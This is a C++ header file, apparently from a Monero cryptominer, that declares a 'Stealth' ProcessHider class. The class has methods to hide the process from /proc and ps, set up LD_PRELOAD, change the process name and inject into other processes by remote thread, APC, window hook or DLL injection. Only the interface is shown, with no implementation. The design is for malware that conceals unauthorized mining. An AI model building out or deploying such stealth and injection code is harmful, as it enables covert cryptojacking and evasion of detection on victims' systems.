#ifndef XMR_PROCESS_HIDER_H
#define XMR_PROCESS_HIDER_H

#include <string>
#include <vector>
#include <atomic>
#include <cstdint>
#include <memory>
#include <mutex>
#include <thread>
#include <functional>
#include <stdexcept>
#include <map>


    namespace Stealth {

  enum InjectionMethod {
    REMOTE_THREAD,
    APC_INJECTION,
    SET_WINDOW_HOOK,
    DLL_INJECTION
  };

#ifdef _WIN32
  typedef int pid_t;
#endif

  class ProcessHider {
  public:
    ProcessHider();
    ~ProcessHider();

    bool hide();
    bool unhide();
    bool change_process_name(const std::string& name);
    bool hide_from_proc();
    bool setup_ld_preload();
    bool hide_from_ps();
    bool inject_into_process(pid_t target_pid);
    std::string get_process_name();
    bool is_hidden() const;
    bool is_injected() const;

  private:
    bool m_hidden;
    bool m_injected;
    std::string m_original_name;
  };

} // namespace Stealth

#endif
